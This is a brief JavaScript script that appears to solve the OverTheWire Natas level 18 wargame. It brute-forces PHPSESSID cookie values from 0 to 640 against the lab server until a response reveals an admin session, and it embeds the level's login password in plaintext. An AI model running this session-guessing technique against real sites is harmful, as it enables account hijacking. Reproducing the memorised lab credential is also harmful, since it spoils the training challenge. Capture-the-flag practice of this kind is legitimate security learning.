//WARNING - Isn't the most efficient code

let fl=0;
for(let i=0;i<=640;i++)
{
	let value=i;
	let url = "http://natas18.natas.labs.overthewire.org/";
	document.cookie="PHPSESSID="+value;
	let xhr = new XMLHttpRequest();
	xhr.open('GET',url,false,"natas18","xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP");
	xhr.onload = function(){
		if(xhr.status!=200)
		{
			console.log("Error");
		}
		else
		{
			console.log(document.cookie);
			if((xhr.response).includes("You are an admin"))
			{
				console.log(xhr.response);
				fl=1;
			}
			document.cookie = "PHPSESSID="+value+"; expires=Thu, 01 Jan 1970 00:00:00 UTC"; //deletes the cookie
		}
	}

	xhr.onerror = function(){
		console.log("Request failed");
	}

	xhr.send();

	if(fl) break;
}
